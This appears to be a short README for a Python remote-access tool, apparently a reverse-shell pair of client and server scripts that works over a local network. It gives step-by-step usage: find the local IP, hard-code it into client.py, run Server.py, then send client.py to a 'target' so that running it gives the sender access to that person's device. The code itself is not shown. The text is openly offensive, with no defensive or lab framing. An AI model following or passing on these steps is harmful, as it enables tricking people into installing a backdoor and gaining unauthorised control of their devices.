Created with python3 

note: this script just work for localhost it means you and your target have to connect to the same network ...!  

The way to use it :-                      
First, you need to run get_localhost_ip.py by ---> python3 get_localhost_ip.py                              
Then copy the output and paste it in client.py exactly in line 8 as a string like "0.0.0.0"                         
After that, you must run Server.py by -----> python3 Server.py                                     
finally you have to send client.py to your target and when your target run client.py you have access to his device
